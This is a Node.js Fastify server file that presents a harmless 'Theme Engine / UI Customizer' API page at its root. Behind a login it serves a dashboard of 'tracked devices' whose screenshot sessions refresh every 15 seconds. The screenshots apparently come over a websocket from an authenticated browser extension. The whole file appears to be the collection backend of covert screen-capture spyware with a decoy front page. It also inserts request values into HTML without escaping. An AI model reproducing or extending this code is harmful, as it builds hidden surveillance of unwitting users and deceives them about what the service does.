require('dotenv').config();
const fs = require('fs');
const path = require('path');
const logger = require('./utils/logger');
const fastify = require('fastify')({ loggerInstance: logger });
const fastifyWebsocket = require('@fastify/websocket');
const { handleConnection } = require('./websocket/handler');
const { startWorker } = require('./db/worker');
const sessionManager = require('./websocket/sessionManager');
const { db } = require('./db');
const config = require('./config');
const { cleanupOldSnapshots } = require('./utils/storage');
const { registerExtensionAuthRoute } = require('./routes/extension-auth');
const { registerAuthRoutes, requireSession } = require('./routes/auth');
const { initExtensionKeysTable } = require('./db/mysql');

const snapshotsDir = path.resolve(process.cwd(), config.STORAGE_DIR, 'snapshots');

fastify.register(fastifyWebsocket);
fastify.register(require('@fastify/formbody'));

// ---------- DASHBOARD AUTH (public login/logout) ----------
registerAuthRoutes(fastify);

// ---------- EXTENSION AUTH (public) ----------
registerExtensionAuthRoute(fastify);

fastify.get('/health', async (request, reply) => {
  return { status: 'healthy', uptime: process.uptime() };
});

fastify.get('/', async (request, reply) => {
  reply.type('text/html').send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Theme Engine API Documentation</title>
      <style>body { font-family: sans-serif; background: #fafafa; padding: 40px; text-align: center; } h1 { color: #333; }</style>
    </head>
    <body>
      <h1>UI Customizer: Theme API</h1>
      <p>Welcome to the developer portal. Please refer to your custom integration specs for theme synchronization endpoints.</p>
    </body>
    </html>
  `);
});

// Snapshot gallery -- Drill-down hierarchical view
fastify.get('/snapshots', { preHandler: requireSession }, async (request, reply) => {
  const { system, session } = request.query;

  const styleHTML = `
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; padding: 24px; }
        h1 { font-size: 22px; margin-bottom: 6px; }
        .info { color: #94a3b8; font-size: 14px; margin-bottom: 24px; display:flex; gap: 10px; align-items:center; }
        .info a { color: #3b82f6; text-decoration: none; }
        .info a:hover { text-decoration: underline; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; }
        .card { background: #1e293b; border-radius: 10px; overflow: hidden; transition: transform 0.15s; text-decoration: none; color: inherit; display: block; border: 1px solid transparent; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .card:hover { transform: translateY(-3px); border-color: #3b82f6; }
        .card.folder { padding: 30px 20px; text-align: center; font-size: 18px; font-weight: bold; }
        .card.folder .sub { display: block; font-size: 13px; color: #94a3b8; margin-top: 8px; font-weight: normal; font-family: monospace; }
        .card img { width: 100%; display: block; aspect-ratio: 16/9; object-fit: cover; }
        .meta { padding: 12px 14px; display: flex; justify-content: space-between; font-size: 12px; color: #94a3b8; }
        .empty { text-align: center; padding: 80px 20px; color: #64748b; }
        .empty p { font-size: 16px; margin-bottom: 8px; }
      </style>
  `;

  // Helper to read directories safely
  const getDirs = (dirPath) => fs.existsSync(dirPath) ? fs.readdirSync(dirPath).filter(f => fs.statSync(path.join(dirPath, f)).isDirectory()) : [];

  // LEVEL 1: OVERVIEW OF ALL SYSTEMS
  if (!system) {
    const systems = getDirs(snapshotsDir);
    const cards = systems.map(s => `<a class="card folder" href="/snapshots?system=${s}">💻 ${s}<span class="sub">View ${getDirs(path.join(snapshotsDir, s)).length} Sessions</span></a>`).join('');
    return reply.type('text/html').send(`
      <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Dashboard - Systems</title>${styleHTML}</head><body>
      <h1>Systems Dashboard</h1>
      <p class="info">${systems.length} tracked devices <span>|</span> <a href="/logout">Sign out</a></p>
      ${systems.length ? `<div class="grid">${cards}</div>` : `<div class="empty"><p>No systems yet.</p></div>`}
      </body></html>
    `);
  }

  // LEVEL 2: SESSIONS FOR A SPECIFIC SYSTEM
  if (system && !session) {
    if (system.includes('..')) return reply.code(400).send('Invalid path');
    const sysDir = path.join(snapshotsDir, system);
    let sessions = getDirs(sysDir).map(s => {
      let count = 0;
      let startTime = 0;
      const sessionPath = path.join(sysDir, s);
      if (fs.existsSync(sessionPath)) {
        const files = fs.readdirSync(sessionPath).filter(f => /\.(jpg|png|webp)$/i.test(f));
        count = files.length;
        if (files.length > 0) {
          startTime = parseInt(files.sort()[0].split('.')[0]) || fs.statSync(sessionPath).birthtimeMs;
        } else {
          startTime = fs.statSync(sessionPath).birthtimeMs || fs.statSync(sessionPath).mtimeMs;
        }
      }
      return { id: s, count, startTime };
    });

    // Sort newest first
    sessions.sort((a, b) => b.startTime - a.startTime);

    const cards = sessions.map(s => {
      const dateStr = s.startTime ? new Date(s.startTime).toLocaleString(undefined, {
        month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true
      }) : 'Unknown Time';

      return `<a class="card folder" href="/snapshots?system=${system}&session=${s.id}">
        📆 ${dateStr}
        <span class="sub">${s.id.substring(0, 8)}... (${s.count} photos)</span>
      </a>`;
    }).join('');

    return reply.type('text/html').send(`
      <!DOCTYPE html><html><head><meta charset="UTF-8"><title>${system} - Sessions</title>${styleHTML}</head><body>
      <h1>Device: ${system}</h1>
      <p class="info"><a href="/snapshots">← Back to Systems</a> <span>|</span> ${sessions.length} sessions</p>
      ${sessions.length ? `<div class="grid">${cards}</div>` : `<div class="empty"><p>No sessions yet.</p></div>`}
      </body></html>
    `);
  }

  // LEVEL 3: SCREENSHOTS IN A SESSION
  if (system.includes('..') || session.includes('..')) return reply.code(400).send('Invalid path');
  const sessionDir = path.join(snapshotsDir, system, session);
  let files = [];
  if (fs.existsSync(sessionDir)) {
    files = fs.readdirSync(sessionDir).filter(f => /\.(webp|jpg|jpeg|png)$/i.test(f)).sort().reverse();
  }

  const cards = files.map(f => {
    const stat = fs.statSync(path.join(sessionDir, f));
    const sizeKb = (stat.size / 1024).toFixed(1);
    const ts = f.replace(/\.\w+$/, '');
    const date = new Date(parseInt(ts)).toLocaleString();
    return `
      <div class="card">
        <a href="/snapshots/${system}/${session}/${f}" target="_blank">
          <img src="/snapshots/${system}/${session}/${f}" loading="lazy" alt="${f}" />
        </a>
        <div class="meta">
          <span class="session">${date}</span>
          <span class="size">${sizeKb} KB</span>
        </div>
      </div>`;
  }).join('');

  reply.type('text/html').send(`
    <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Session Screenshots</title>${styleHTML}</head><body>
    <h1>Session Gallery</h1>
    <p class="info"><a href="/snapshots?system=${system}">← Back to ${system}</a> <span>|</span> ${files.length} screenshots</p>
    ${files.length > 0 ? `<div class="grid">${cards}</div>` : `<div class="empty"><p>No snapshots yet.</p></div>`}
    <script>setTimeout(() => location.reload(), 15000);</script>
    </body></html>
  `);
});

// Serve individual nested snapshot files
fastify.get('/snapshots/:system/:session/:filename', { preHandler: requireSession }, async (request, reply) => {
  const { system, session, filename } = request.params;

  if (/[\\/\\\\]/.test(filename) || system.includes('..') || session.includes('..')) {
    return reply.code(400).send({ error: 'Invalid path' });
  }

  const filePath = path.join(snapshotsDir, system, session, filename);
  if (!fs.existsSync(filePath)) {
    return reply.code(404).send({ error: 'Snapshot not found' });
  }

  const ext = path.extname(filename).toLowerCase();
  const mimeTypes = { '.webp': 'image/webp', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png' };

  reply.header('Cache-Control', 'public, max-age=31536000');
  const stream = fs.createReadStream(filePath);
  return reply.type(mimeTypes[ext] || 'application/octet-stream').send(stream);
});

fastify.register(async function (fastify) {
  fastify.get('/stream', { websocket: true }, (socket, req) => {
    handleConnection(socket, req);
  });
});

let workerIntervalId;
let cleanupIntervalId;

const start = async () => {
  try {
    // Init MySQL extension_keys table before accepting connections
    await initExtensionKeysTable();

    const port = process.env.PORT || 3000;
    await fastify.listen({ port: port, host: '0.0.0.0' });
    workerIntervalId = startWorker(logger);

    // ── 24-hour disk janitor ─────────────────────────────────────────────────
    function runDailyCleanup() {
      // 1. Delete screenshot image files older than 1 day
      cleanupOldSnapshots(1);

      // 2. Delete .jsonl buffer dump files older than 1 day
      const storageDir = path.resolve(process.cwd(), config.STORAGE_DIR);
      const yesterday = Date.now() - 24 * 60 * 60 * 1000;
      fs.readdir(storageDir, (err, files) => {
        if (err) return;
        files.filter(f => f.endsWith('.jsonl')).forEach(f => {
          const fp = path.join(storageDir, f);
          fs.stat(fp, (e, s) => {
            if (!e && s.mtimeMs < yesterday) fs.unlink(fp, () => { });
          });
        });
      });

      // 3. Purge expired SQLite dashboard sessions and old extension key cache
      try {
        db.prepare("DELETE FROM dashboard_sessions WHERE expires_at < datetime('now')").run();
      } catch (_) { /* table may not exist yet on first boot */ }

      logger.info('Daily cleanup completed');
    }

    runDailyCleanup();
    cleanupIntervalId = setInterval(runDailyCleanup, 24 * 60 * 60 * 1000);

    logger.info({ port }, 'Theme Server listening');
  } catch (err) {
    logger.error(err);
    process.exit(1);
  }
};

function shutdown(signal) {
  logger.info({ signal }, 'Shutdown signal received');

  if (workerIntervalId) clearInterval(workerIntervalId);
  if (cleanupIntervalId) clearInterval(cleanupIntervalId);
  sessionManager.shutdown();

  fastify.close().then(() => {
    db.close();
    logger.info('Server shut down cleanly');
    process.exit(0);
  }).catch((err) => {
    logger.error({ err }, 'Error during shutdown');
    process.exit(1);
  });
}

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));

start();
